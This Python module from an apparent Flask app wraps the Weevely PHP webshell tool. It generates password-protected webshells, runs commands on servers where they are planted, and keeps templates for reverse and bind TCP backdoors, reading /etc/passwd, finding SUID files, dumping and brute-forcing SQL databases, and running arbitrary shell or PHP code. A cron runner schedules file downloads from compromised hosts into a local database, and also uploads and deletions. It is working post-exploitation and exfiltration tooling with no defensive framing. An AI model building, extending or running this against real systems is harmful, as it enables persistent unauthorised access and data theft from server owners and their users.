# apps/weevely/module_executor.py
import os
import subprocess
import tempfile
import time
import json
import re
import logging
from typing import Dict, List, Optional, Any, Union
from flask import current_app, has_app_context
from pathlib import Path

class WeevelyPayloadGenerator:
    """Simple Weevely Payload Generator"""
    
    def __init__(self):
        # Determine base directory in a way that doesn't require Flask app context
        if has_app_context():
            base_dir = Path(current_app.root_path)
        else:
            # project root: go up two levels from this file (apps/weevely/.. -> project root)
            base_dir = Path(__file__).resolve().parents[2]

        # Path to bundled weevely script (relative to this module)
        self.weevely_path = str(Path(__file__).resolve().parent / 'weevely3' / 'weevely.py')
        # Default output directory inside dataserver/uploads at project root
        self.output_dir = str(base_dir / 'dataserver' / 'uploads')
        os.makedirs(self.output_dir, exist_ok=True)
        
        if not os.path.exists(self.weevely_path):
            raise FileNotFoundError(f"Weevely not found: {self.weevely_path}")
    
    def create(self, filename: str, password: str) -> dict:
        """
        Tạo weevely payload
        
        Args:
            filename: Tên file (vd: shell.php)
            password: Password cho webshell
            
        Returns:
            dict: {'success': bool, 'path': str, 'error': str}
        """
        try:
            output_path = os.path.join(self.output_dir, filename)
            
            # Generate payload
            cmd = ['python3', self.weevely_path, 'generate', password, output_path]
            #print(f'[+] Generate payload: {cmd}')
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30,
                cwd=os.path.dirname(self.weevely_path)
            )
            #print(f'[+] Result: {result.returncode} && {os.path.exists(output_path)}')
            if result.returncode == 0 and os.path.exists(output_path):
                print(f'[+] Complete generate payload: {output_path}, {filename}, {password}')
                return {
                    'success': True,
                    'path': output_path,
                    'filename': filename,
                    'password': password
                }
            else:
                print(f'[-] Error generate payload: {result.stderr}')
                return {
                    'success': False,
                    'error': result.stderr or 'Generation failed'
                }
                
        except Exception as e:
            return {'success': False, 'error': str(e)}


class WeevelyModuleExecutor:
    """
    Advanced Weevely Module Executor
    Thực thi các module command đặc biệt của Weevely với format output tốt
    """
    
    # Các module phổ biến và command patterns
    COMMON_MODULES = {
        # File Operations
        'file_find': ':file_find -vector {vector} -ftype {ftype} {path} {pattern}',
        'file_read': ':file_read -vector {vector} {path}',
        'file_download': ':file_download -vector {vector} {remote_path} {local_path}',
        'file_upload': ':file_upload -vector {vector} {local_path} {remote_path}',
        'file_webdownload': ':file_webdownload {url} {remote_path}',
        'file_ls': ':file_ls {path}',
        'file_cd': ':file_cd {path}',
        'file_cp': ':file_cp {source} {dest}',
        'file_mv': ':file_mv {source} {dest}',
        'file_rm': ':file_rm {path}',
        'file_mkdir': ':file_mkdir {path}',
        'file_check': ':file_check {path}',
        'file_grep': ':file_grep -pattern "{pattern}" {path}',
        'file_tar': ':file_tar -compress {archive_path} {files}',
        'file_gzip': ':file_gzip {file_path}',
        'file_zip': ':file_zip {archive_path} {files}',
        
        # System Information
        'system_info': ':system_info',
        'system_extensions': ':system_extensions',
        'audit_phpconf': ':audit_phpconf',
        'audit_filesystem': ':audit_filesystem',
        'audit_suidsgid': ':audit_suidsgid',
        'audit_etcpasswd': ':audit_etcpasswd',
        
        # Shell Operations
        'shell_sh': ':shell_sh {command}',
        'shell_su': ':shell_su {user} {command}',
        'shell_php': ':shell_php {php_code}',
        
        # Network Operations
        'net_scan': ':net_scan {target}',
        'net_curl': ':net_curl {url}',
        'net_proxy': ':net_proxy',
        'net_ifconfig': ':net_ifconfig',
        
        # SQL Operations
        'sql_console': ':sql_console {host} {user} {password} {database}',
        'sql_dump': ':sql_dump {host} {user} {password} {database}',
        
        # Bruteforce
        'bruteforce_sql': ':bruteforce_sql {host} {userlist} {passlist}',
        
        # Backdoor Operations
        'backdoor_reversetcp': ':backdoor_reversetcp {host} {port}',
        'backdoor_bindtcp': ':backdoor_bindtcp {port}',
        
        # Process Operations
        'procs_list': ':procs_list',
        'procs_kill': ':procs_kill {pid}',
    }
    
    # Vector types for file operations
    FILE_VECTORS = [
        'file_get_contents',  # Default
        'fread',
        'fopen',
        'file',
        'readfile',
        'base64',
        'curl'
    ]
    
    def __init__(self, weevely_path: Optional[str] = None):
        """Initialize module executor
        
        Args:
            weevely_path: Custom path to weevely.py (optional)
        """
        if weevely_path:
            # Use provided absolute/relative path as-is
            self.weevely_path = weevely_path
        else:
            # Default to weevely within this package (no Flask app context required)
            self.weevely_path = os.path.join(
                os.path.dirname(os.path.abspath(__file__)), 'weevely3', 'weevely.py'
            )
        
        self.temp_dir = tempfile.gettempdir()
        self.logger = logging.getLogger(__name__)
        
        # Verify weevely exists
        if not os.path.exists(self.weevely_path):
            raise FileNotFoundError(f"Weevely not found at: {self.weevely_path}")
    
    def test_connection(self, url: str, password: str, timeout: int = 10) -> Dict:
        """
        Test connection to webshell
        
        Args:
            url: URL của webshell
            password: Password của webshell
            timeout: Timeout in seconds
            
        Returns:
            Dict chứa kết quả test connection
        """
        try:
            print(f"[+] Weevely test connection: {url}, {password}, {timeout}")
            result = self.execute_module(url, password, ":system_info", timeout)
            
            #print(f"[+] Result: {result}")
            parsed_data = result.get('parsed_output', {}) if isinstance(result, dict) else {}
            has_info = bool(parsed_data.get('info')) if isinstance(parsed_data, dict) else False
            ok_status = parsed_data.get('status') == 'ok' if isinstance(parsed_data, dict) else False

            if result['success'] or (has_info and ok_status):
                # Prefer parsed info when available
                system_info = parsed_data.get('info', {}) if ok_status else {}
                if system_info['whoami'] != None or system_info['os'] != None or system_info['php_version'] != None:
                    return {
                        'success': True,
                        'message': 'Connection successful',
                        'response_time': result.get('execution_time'),
                        'data': system_info,
                        #'raw_result': result #debug
                    }
                else:
                    return {
                        'success': False,
                        'message': 'Connection failed',
                        'error': result.get('error', 'Unknown error'),
                        'data': parsed_data.get('info') if isinstance(parsed_data, dict) else None,
                        #'raw_result': result #debug
                    }
            else:
                # Still include any parsed data for troubleshooting
                return {
                    'success': False,
                    'message': 'Connection failed',
                    'error': result.get('error', 'Unknown error'),
                    'data': parsed_data.get('info') if isinstance(parsed_data, dict) else None,
                    #'raw_result': result #debug
                }
                
        except Exception as e:
            return {
                'success': False,
                'message': 'Connection test failed',
                'error': str(e)
            }
    
    def execute_module(self,
                      url: str,
                      password: str,
                      module_command: str,
                      timeout: int = 60,
                      retries: int = 1) -> Dict:
        """
        Execute một module command cụ thể với retry mechanism
        
        Args:
            url: URL của webshell
            password: Password của webshell
            module_command: Command để thực thi
            timeout: Timeout in seconds
            retries: Number of retry attempts
            
        Returns:
            Dict chứa kết quả thực thi
        """
        last_error = None
        
        for attempt in range(retries + 1):
            try:
                # Validate inputs
                if not self._validate_inputs(url, password, module_command):
                    return {
                        'success': False,
                        'error': 'Invalid input parameters',
                        'module_command': module_command
                    }
                
                # Build command
                cmd = [
                    'python3', self.weevely_path, 'terminal',
                    url, password, module_command
                ]
                
                self.logger.info(f"Executing module (attempt {attempt + 1}): {module_command}")
                
                start_time = time.time()
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    cwd=os.path.dirname(self.weevely_path),
                    env=os.environ.copy()  # Preserve environment
                )
                execution_time = time.time() - start_time
                # Clean outputs for consistent downstream use
                cleaned_stdout = self._clean_file_content(result.stdout or "")
                cleaned_stderr = self._clean_file_content(result.stderr or "")
                combined_output = cleaned_stdout + ("\n" + cleaned_stderr if cleaned_stderr else "")
                
                # Check for common error patterns
                if result.returncode != 0 or self._has_error_indicators(result.stdout, result.stderr):
                    error_msg = self._extract_error_message(result.stdout, result.stderr)
                    return {
                        'success': False,
                        'module_command': module_command,
                        'raw_output': result.stdout,
                        'error_output': result.stderr,
                        'clean_stdout': cleaned_stdout,
                        'clean_stderr': cleaned_stderr,
                        'combined_output': combined_output,
                        'execution_time': execution_time,
                        'return_code': result.returncode,
                        'error': error_msg,
                        'attempt': attempt + 1,
                        # Still try to parse useful data even if error indicators were found
                        'parsed_output': self._parse_module_output(module_command, cleaned_stdout, cleaned_stderr)
                    }
                
                return {
                    'success': True,
                    'module_command': module_command,
                    'raw_output': result.stdout,
                    'error_output': result.stderr,
                    'clean_stdout': cleaned_stdout,
                    'clean_stderr': cleaned_stderr,
                    'combined_output': combined_output,
                    'execution_time': execution_time,
                    'return_code': result.returncode,
                    'parsed_output': self._parse_module_output(module_command, cleaned_stdout, cleaned_stderr),
                    'executed_at': time.time(),
                    'attempt': attempt + 1
                }
                
            except subprocess.TimeoutExpired:
                last_error = f'Command timed out after {timeout} seconds'
                if attempt < retries:
                    self.logger.warning(f"Timeout on attempt {attempt + 1}, retrying...")
                    time.sleep(1)
                    continue
                    
            except Exception as e:
                last_error = f"Execution error: {str(e)}"
                if attempt < retries:
                    self.logger.warning(f"Error on attempt {attempt + 1}: {e}, retrying...")
                    time.sleep(1)
                    continue
        
        return {
            'success': False,
            'error': last_error,
            'module_command': module_command,
            'total_attempts': retries + 1
        }
    
    def _validate_inputs(self, url: str, password: str, module_command: str) -> bool:
        """Validate input parameters"""
        if not url or not url.startswith(('http://', 'https://')):
            return False
        if not password or len(password.strip()) == 0:
            return False
        if not module_command or not module_command.startswith(':'):
            return False
        return True
    
    def _has_error_indicators(self, stdout: str, stderr: str) -> bool:
        """Check for common error indicators in output"""
        error_patterns = [
            'Error',
            'Fatal error',
            'Parse error',
            'Connection failed',
            'Permission denied',
            'No such file',
            'command not found'
        ]
        
        combined_output = (stdout + stderr).lower()
        return any(pattern.lower() in combined_output for pattern in error_patterns)
    
    def _extract_error_message(self, stdout: str, stderr: str) -> str:
        """Extract meaningful error message from output"""
        if stderr:
            return stderr.strip()
        
        # Look for error patterns in stdout
        lines = stdout.split('\n')
        for line in lines:
            line = line.strip()
            if any(err in line.lower() for err in ['error', 'failed', 'denied']):
                return line
        
        return "Command execution failed"
    
    def file_find(self,
                  url: str,
                  password: str,
                  search_path: str = "/",
                  pattern: str = "",
                  file_type: str = "f",
                  vector: str = "sh_find") -> Dict:
        """
        Tìm kiếm files/folders với improved parsing
        """
        # Escape special characters in pattern
        escaped_pattern = re.escape(pattern) if pattern else ""
        command = f":file_find -vector {vector} -ftype {file_type} {search_path} {escaped_pattern}"
        
        result = self.execute_module(url, password, command)
        
        if result['success']:
            files = self._parse_file_list(result['raw_output'])
            result['files'] = files
            result['file_count'] = len(files)
            result['search_params'] = {
                'path': search_path,
                'pattern': pattern,
                'type': file_type,
                'vector': vector
            }
        
        return result
    
    def file_read(self,
                  url: str,
                  password: str,
                  file_path: str,
                  vector: str = "file_get_contents",
                  encoding: str = "utf-8") -> Dict:
        """
        Đọc nội dung file với encoding support
        """
        command = f":file_read -vector {vector} {file_path}"
        result = self.execute_module(url, password, command)
        
        if result['success']:
            try:
                content = self._clean_file_content(result['raw_output'], encoding)
                result['file_content'] = content
                result['file_path'] = file_path
                result['content_length'] = len(content)
                result['line_count'] = len(content.splitlines()) if content else 0
                result['encoding'] = encoding
                
                # File analysis
                result['file_analysis'] = self._analyze_file_content(content)
                
            except UnicodeDecodeError as e:
                result['success'] = False
                result['error'] = f"Encoding error: {str(e)}"
        
        return result
    
    def batch_execute(self, 
                     url: str, 
                     password: str, 
                     commands: List[str],
                     delay: float = 0.5) -> Dict:
        """
        Execute multiple commands in batch
        
        Args:
            url: URL của webshell
            password: Password
            commands: List of commands to execute
            delay: Delay between commands in seconds
            
        Returns:
            Dict containing batch results
        """
        results = []
        start_time = time.time()
        
        for i, cmd in enumerate(commands):
            self.logger.info(f"Executing batch command {i+1}/{len(commands)}: {cmd}")
            
            result = self.execute_module(url, password, cmd)
            results.append({
                'command_index': i,
                'command': cmd,
                'result': result
            })
            
            # Add delay between commands (except for last one)
            if i < len(commands) - 1 and delay > 0:
                time.sleep(delay)
        
        total_time = time.time() - start_time
        successful_commands = sum(1 for r in results if r['result']['success'])
        
        return {
            'success': True,
            'total_commands': len(commands),
            'successful_commands': successful_commands,
            'failed_commands': len(commands) - successful_commands,
            'total_execution_time': total_time,
            'results': results,
            'executed_at': time.time()
        }
    
    def _analyze_file_content(self, content: str) -> Dict:
        """Analyze file content and return metadata"""
        if not content:
            return {'type': 'empty'}
        
        analysis = {
            'size_bytes': len(content.encode('utf-8')),
            'lines': len(content.splitlines()),
            'is_binary': '\x00' in content,
            'contains_php': '<?php' in content or '<?=' in content,
            'contains_sql': any(kw in content.lower() for kw in ['select', 'insert', 'update', 'delete', 'create table']),
            'contains_base64': bool(re.search(r'[A-Za-z0-9+/]{20,}={0,2}', content)),
        }
        
        # Detect file type based on content
        if analysis['contains_php']:
            analysis['probable_type'] = 'php'
        elif analysis['contains_sql']:
            analysis['probable_type'] = 'sql'
        elif content.strip().startswith(('<?xml', '<html', '<!DOCTYPE')):
            analysis['probable_type'] = 'markup'
        elif content.strip().startswith(('{', '[')):
            analysis['probable_type'] = 'json'
        else:
            analysis['probable_type'] = 'text'
        
        return analysis
    
    def _parse_file_list(self, output: str) -> List[Dict]:
        """Parse danh sách file từ output với metadata"""
        files = []
        lines = output.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if line and not line.startswith('[') and '/' in line:
                # Try to extract file metadata if available
                file_info = {'path': line}
                
                # Check if line contains size, permissions, etc.
                parts = line.split()
                if len(parts) > 1:
                    # Try to parse ls -la style output
                    if parts[0].startswith(('-', 'd', 'l')):
                        file_info.update({
                            'permissions': parts[0],
                            'path': ' '.join(parts[8:]) if len(parts) > 8 else line
                        })
                        if len(parts) > 4:
                            try:
                                file_info['size'] = int(parts[4])
                            except (ValueError, IndexError):
                                pass
                
                files.append(file_info)
        
        return files
    
    def _clean_file_content(self, output: str, encoding: str = "utf-8") -> str:
        """Clean và format file content với encoding support"""
        lines = output.split('\n')
        
        # Remove weevely prompt lines và control characters
        cleaned_lines = []
        in_content = False
        
        for line in lines:
            # Skip prompt lines
            if line.startswith(('www-data@', 'root@', '$', '#')) or line.strip().startswith('['):
                continue
            
            # Remove ANSI escape sequences
            line = re.sub(r'\x1b\[[0-9;]*m', '', line)
            
            # Start capturing content after prompts
            if not in_content and line.strip():
                in_content = True
            
            if in_content:
                cleaned_lines.append(line)
        
        content = '\n'.join(cleaned_lines)
        
        # Remove trailing empty lines
        content = content.rstrip('\n')
        
        return content

    def _parse_module_output(self, module_command: str, raw_output: str, error_output: str = "") -> Dict:
        """
        Parse module output based on command type
        
        Args:
            module_command: The executed module command
            raw_output: Raw output from weevely
            error_output: Error output (sometimes contains actual data)
            
        Returns:
            Dict containing parsed output
        """
        try:
            # Use error_output if raw_output is empty (weevely sometimes outputs to stderr)
            output_to_parse = raw_output if raw_output.strip() else error_output
            
            # Clean the output first
            cleaned_output = self._clean_file_content(output_to_parse)
            
            # Parse based on command type
            if ':system_info' in module_command:
                print(f"[+] Đang phân tích dữ liệu output System info: .....")
                return self._parse_system_info(cleaned_output)
            elif ':file_ls' in module_command:
                print(f"[+] Đang phân tích dữ liệu output File listing: .....")
                return self._parse_file_listing(cleaned_output)
            elif ':procs_list' in module_command:
                print(f"[+] Đang phân tích dữ liệu output Process list: .....")
                return self._parse_process_list(cleaned_output)
            elif ':audit_phpconf' in module_command:
                print(f"[+] Đang phân tích dữ liệu output PHP config: .....")
                return self._parse_php_config(cleaned_output)
            elif ':file_find' in module_command:
                print(f"[+] Đang phân tích dữ liệu output File find: .....")
                return self._parse_file_find(cleaned_output)
            elif ':shell_sh' in module_command:
                return self._parse_shell_output(cleaned_output)
            else:
                # Generic parsing for unknown commands
                return {
                    'type': 'generic',
                    'content': cleaned_output,
                    'lines': cleaned_output.split('\n') if cleaned_output else [],
                    'line_count': len(cleaned_output.split('\n')) if cleaned_output else 0
                }
                
        except Exception as e:
            self.logger.warning(f"Error parsing module output: {str(e)}")
            return {
                'type': 'unparsed',
                'content': raw_output,
                'parse_error': str(e)
            }
    
    def _parse_system_info(self, output: str) -> Dict[str, Any]:
        """Parse system info output từ weevely :system_info (gọn trong 1 hàm)"""
        # default values
        info = {
            'document_root': None,
            'pwd': None,
            'script_folder': None,
            'script': None,
            'php_self': None,
            'whoami': None,
            'hostname': None,
            'open_basedir': None,
            'disable_functions': None,
            'safe_mode': False,
            'uname': None,
            'os': None,
            'client_ip': None,
            'server_name': None,
            'max_execution_time': None,
            'php_version': None
        }

        lines = [l.rstrip("\n") for l in output.splitlines()]

        errors = []
        for l in lines:
            ls = l.strip()
            if not ls.startswith("|") and ls and ("error" in ls.lower() or "404" in ls):
                errors.append(ls)

        for line in lines:
            ls = line.strip()
            if not ls.startswith("|") or "+" in ls or "-" in ls:
                continue
            # Match pattern: | key | value |
            m = re.match(r"^\|\s*([^|]+?)\s*\|\s*(.*?)\s*\|$", ls)
            if not m:
                continue
            key, value = m.groups()
            key, value = key.strip(), value.strip()

            # ép kiểu ngay trong hàm
            low = value.lower()
            if low in ("none", ""):
                parsed_val = None
            elif low == "false":
                parsed_val = False
            elif low == "true":
                parsed_val = True
            elif re.fullmatch(r"-?\d+", value):
                try:
                    parsed_val = int(value)
                except ValueError:
                    parsed_val = value
            else:
                parsed_val = value

            if key in info:
                info[key] = parsed_val

        # hậu xử lý disable_functions → list nếu có csv
        if isinstance(info.get('disable_functions'), str) and "," in info['disable_functions']:
            parts = [p.strip() for p in info['disable_functions'].split(",") if p.strip()]
            info['disable_functions'] = parts or None

        # max_execution_time đảm bảo int hoặc None
        if info.get('max_execution_time') is not None and not isinstance(info['max_execution_time'], int):
            try:
                info['max_execution_time'] = int(str(info['max_execution_time']))
            except Exception:
                info['max_execution_time'] = None

        ok = not errors
        status = "ok" if ok else "unavailable"

        return {
            "ok": ok,
            "status": status,
            "errors": errors or None,
            "info": info,
            #"raw_content": output
        }

    def _parse_file_listing(self, output: str) -> Dict:
        """Parse file listing output"""
        lists = []
        
        lines = output.split('\n')
        for line in lines:
            line = line.strip()
            if not line:
                continue
            lists.append(line)
        return {
            'type': 'file_listing',
            'lists': lists,
            'total_F': len(lists)
            #'raw_content': output
        }
    
    def _parse_process_list(self, output: str) -> Dict:
        """Parse process list output"""
        processes = []
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('PID'):
                continue
            
            parts = line.split()
            if len(parts) >= 2:
                processes.append({
                    'pid': parts[0],
                    'command': ' '.join(parts[1:]) if len(parts) > 1 else 'Unknown'
                })
        
        return {
            'type': 'process_list',
            'processes': processes,
            'process_count': len(processes),
            'raw_content': output
        }
    
    def _parse_php_config(self, output: str) -> Dict:
        """Parse PHP configuration output"""
        config = {}
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            if '=' in line:
                key, value = line.split('=', 1)
                config[key.strip()] = value.strip()
        
        return {
            'type': 'php_config',
            'config': config,
            'config_count': len(config),
            'raw_content': output
        }
    
    def _parse_file_find(self, output: str) -> Dict:
        """Parse file find output"""
        files = self._parse_file_list(output)
        return {
            'type': 'file_find',
            'files': files,
            'file_count': len(files),
            'raw_content': output
        }
    
    def _parse_shell_output(self, output: str) -> Dict:
        """Parse shell command output"""
        return {
            'type': 'shell_output',
            'content': output,
            'lines': output.split('\n'),
            'line_count': len(output.split('\n')),
            'raw_content': output
        }

    # Các methods khác giữ nguyên nhưng thêm logging và error handling tốt hơn
    def get_session_info(self, url: str, password: str) -> Dict:
        """Get comprehensive session information"""
        session_commands = [
            ":system_info",
            ":audit_phpconf", 
            ":file_ls /",
            ":procs_list"
        ]
        
        session_info = {
            'url': url,
            'tested_at': time.time(),
            'modules_tested': []
        }
        
        for cmd in session_commands:
            result = self.execute_module(url, password, cmd, timeout=30)
            session_info['modules_tested'].append({
                'command': cmd,
                'success': result['success'],
                'execution_time': result.get('execution_time', 0)
            })
            
            if result['success']:
                if cmd == ":system_info":
                    session_info['system_info'] = result.get('parsed_output', {})
                elif cmd == ":audit_phpconf":
                    session_info['php_config'] = result.get('parsed_output', {})
        
        return session_info


class CronWeevelyRunner:
    """Runner class that executes cron jobs by ID using module executor.
    Resolves URL/password/functions from database at runtime and ensures
    downloads are saved to dataserver/download with DataFile logging.
    """

    @staticmethod
    def _download_folder() -> str:
        from flask import current_app
        import os
        # Use singular 'download' folder per requirement
        path = os.path.join(current_app.root_path, '..', 'dataserver', 'download')
        os.makedirs(path, exist_ok=True)
        return path

    @staticmethod
    def _build_download_command(job_params: dict) -> str:
        # Expect remote path and optional vector
        remote_path = job_params.get('remote_path') or job_params.get('target_path')
        vector = job_params.get('vector')
        if not remote_path:
            raise ValueError('No remote path specified for download job')
        import os
        local_path = os.path.join(CronWeevelyRunner._download_folder(), os.path.basename(remote_path))
        if vector:
            return f":file_download -vector {vector} {remote_path} {local_path}", local_path, remote_path
        return f":file_download {remote_path} {local_path}", local_path, remote_path

    @staticmethod
    def _log_data_file(local_path: str, remote_path: str, connection_id: str) -> int:
        from apps.models import db, DataFile
        from datetime import datetime
        from hashlib import sha256
        import os
        
        try:
            file_size = os.path.getsize(local_path)
            with open(local_path, 'rb') as f:
                file_hash = sha256(f.read()).hexdigest()
            
            # Kiểm tra xem file đã tồn tại trong database chưa (dựa trên hash)
            existing_file = DataFile.get_by_file_hash(file_hash)
            
            if existing_file:
                # File đã tồn tại, chỉ update thời gian
                existing_file.file_updated_at = datetime.utcnow()
                db.session.commit()
                print(f"[+] File already exists (hash: {file_hash[:8]}...), updated timestamp only")
                return existing_file.file_id
            else:
                # File mới, tạo record mới với tên file duy nhất
                base_filename = os.path.basename(local_path)
                name, ext = os.path.splitext(base_filename)
                
                # Tìm tên file duy nhất nếu có trùng tên
                counter = 1
                new_filename = base_filename
                
                while DataFile.get_by_file_name(new_filename):
                    new_filename = f"{name}_{counter}{ext}"
                    counter += 1
                
                # Tạo tên file mới trên disk nếu cần
                if new_filename != base_filename:
                    new_local_path = os.path.join(os.path.dirname(local_path), new_filename)
                    os.rename(local_path, new_local_path)
                    local_path = new_local_path
                    print(f"[+] Renamed file to avoid conflict: {base_filename} -> {new_filename}")
                
                # Tạo record mới trong database
                data_file = DataFile(
                    file_name=new_filename,
                    source_path=remote_path or '',
                    local_path=local_path,
                    file_type='download',
                    file_size=file_size,
                    file_hash=file_hash,
                    connection_id=connection_id,
                    file_created_at=datetime.utcnow(),
                    file_updated_at=datetime.utcnow(),
                    password=''
                )
                
                db.session.add(data_file)
                db.session.commit()
                print(f"[+] New file logged to database: {new_filename} (hash: {file_hash[:8]}...)")
                return data_file.file_id
                
        except Exception as e:
            print(f"[-] Error logging data file: {str(e)}")
            db.session.rollback()
            return 0

    @staticmethod
    def run_cron_job(job_id: int) -> dict:
        from apps.models import CronJob, ShellConnection
        from flask import current_app
        import json as _json

        cron_job = CronJob.find_by_id(job_id)
        if not cron_job:
            return {'success': False, 'error': 'Cron job not found'}
        if not cron_job.is_active:
            return {'success': False, 'error': 'Cron job is inactive'}

        try:
            params = _json.loads(cron_job.job_data) if cron_job.job_data else {}
        except Exception:
            params = {}

        # Resolve weevely connection
        weevely_conn = None
        if cron_job.weevely_connection_id:
            weevely_conn = ShellConnection.get_by_id(cron_job.weevely_connection_id)
        if not weevely_conn or not weevely_conn.password or not weevely_conn.url:
            return {'success': False, 'error': 'Weevely connection not found or missing credentials'}

        executor = WeevelyModuleExecutor()

        # Map job type to module command
        module_command = None
        local_path = None
        remote_path = None
        if cron_job.job_type == 'command':
            module_command = params.get('command')
        elif cron_job.job_type == 'download':
            module_command, local_path, remote_path = CronWeevelyRunner._build_download_command(params)
        elif cron_job.job_type == 'upload':
            source_path = params.get('source_path')
            target_path = params.get('target_path')
            vector = params.get('vector')
            if not source_path or not target_path:
                return {'success': False, 'error': 'Source and target paths required for upload job'}
            if vector:
                module_command = f":file_upload -vector {vector} {source_path} {target_path}"
            else:
                module_command = f":file_upload {source_path} {target_path}"
        elif cron_job.job_type == 'file_operation':
            operation = params.get('operation')
            source = params.get('source')
            dest = params.get('destination')
            if operation == 'copy':
                module_command = f":file_cp {source} {dest}"
            elif operation == 'move':
                module_command = f":file_mv {source} {dest}"
            elif operation == 'delete':
                module_command = f":file_rm {source}"
            elif operation == 'mkdir':
                module_command = f":file_mkdir {source}"
            else:
                return {'success': False, 'error': f'Unknown operation: {operation}'}
        else:
            return {'success': False, 'error': f'Unknown job type: {cron_job.job_type}'}

        if not module_command or not module_command.startswith(':'):
            return {'success': False, 'error': 'Invalid or missing module command'}

        # Execute via executor
        result = executor.execute_module(weevely_conn.url, weevely_conn.password, module_command)

        # On successful download, log to DB
        if result.get('success') and local_path:
            try:
                file_id = CronWeevelyRunner._log_data_file(local_path, remote_path, weevely_conn.connection_id)
                result['saved_to'] = local_path
                result['data_file_id'] = file_id
            except Exception:
                pass

        return result